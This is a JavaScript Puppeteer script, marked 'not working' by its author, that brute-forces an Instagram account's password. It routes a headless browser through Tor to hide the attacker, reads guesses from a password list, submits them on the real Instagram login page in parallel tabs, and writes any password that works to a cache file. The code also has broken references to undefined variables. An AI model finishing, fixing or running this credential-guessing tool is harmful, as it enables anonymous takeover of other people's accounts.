// TODO - not working
import * as puppeteer from 'puppeteer'
import { createInterface } from 'node:readline/promises'
import { createReadStream } from 'node:fs'
import { writeFile, readFile } from 'node:fs/promises'

const runTab = async (browser, page, psw) => {

    if (igValidPsw(psw)) {

        // ------------------------------ RUN -----------------------------
        await page.goto(
            'https://www.instagram.com/accounts/login/',
            {
                waitUntil: 'networkidle0'
            })

            // if cookie dialog is present > click deny all cookies
            if ((await page.$('button._a9--._a9_1')) !== null) {
                await page.$eval('button._a9--._a9_1', el => el.click())
            }

            // fill the fields
            await page.waitForSelector('input[name="username"]')
            await page.type('input[name="username"]', username)
            await page.type('input[name="password"]', line.value)
            await page.$eval('button[type="submit"]', el => el.click())
            // r is a CDPElementHandle
            const r = await Promise.race([
                page.waitForNavigation(),
                page.waitForSelector('#slfErrorAlert')
            ])

            const url = new URL(page.url())
            // auth regex
            const authRe = new RegExp('/accounts/login/*', 'g')

            let data = {}

            if (authRe.test(url.pathname)) {
                // console.log('@AUTH-PATH >> ', url.pathname)

                data = JSON.stringify({
                    count,
                }, null, 2)

                writeFile('./cache.json', data, (err) => {
                    if (err) throw err
                })

                
            } else {

                data = JSON.stringify({
                    count,
                    psw: line.value
                }, null, 2)

                await writeFile('./cache.json', data)
                // close when all stuff is done
                await browser.close()
                process.exit()
            }


    }

}

// ------------------------------------ MAIN ----------------------------------
(async () => {

    // set the ig username here
    const username = 'INSTAGRAM-USERNAME'
    // number of threads / tabs
    const threads = 5

    const igValidPsw = (igPsw) => (igPsw.length > 5)

    // --------------------------------- TOR ----------------------------------
    try {

        const browser = await puppeteer.launch({
            args: ['--proxy-server=socks5://127.0.0.1:9050'],
            headless: 'new'
            // headless: false
        })

        const page = await browser.newPage()
        await page.goto('https://check.torproject.org/')


        const isUsingTor = await page.$eval('body', (el) =>
            el.innerHTML.includes('Congratulations. This browser is configured to use Tor')
        )

        if (!isUsingTor) {
            console.log('Not using Tor. Closing...')
            return await browser.close()
        }
        // now you can go anywhere you want

        // ---------------------------------- CACHE -------------------------------
        // restart from count in cache.json (set to zero to start with new file)
        const cacheStr = await readFile('./cache.json', 'utf-8')
        const jsonData = await JSON.parse(cacheStr)
        const bkCount = jsonData.count

        // ----------------------------------- PSW --------------------------------
        // Read stream from file
        const fileStream = await createReadStream('./psw.lst')

        // Read line by one manually with iterator
        const rl = createInterface({
            input: fileStream,
            crlfDelay: Infinity,
            outout: process.stdout
        })

        const it = rl[Symbol.asyncIterator]()

        let loop = false
        let count = 0
        // First line of the file @LINE >>  { value: 'slabclimbing', done: false }
        let line_zero = await it.next()

        if (!line_zero.done) loop = true

        // loop on all other lines
        // while (!line.done) {
        while (loop) {

            const lines = []

            for (let i = 0; i < threads; i++) {
                const line = await it.next()
                lines.push(line.value)

                if (line.done) loop = false
            }
            
            count = count + threads

            lines.forEach(async (psw) => {

                const page = await browser.newPage()
                await runTab(browser, page, psw)
            })

        }

        // close when all stuff is done
        await browser.close()

    } catch (err) {
        console.log('@CATCH >> ', err.message)
    }

})()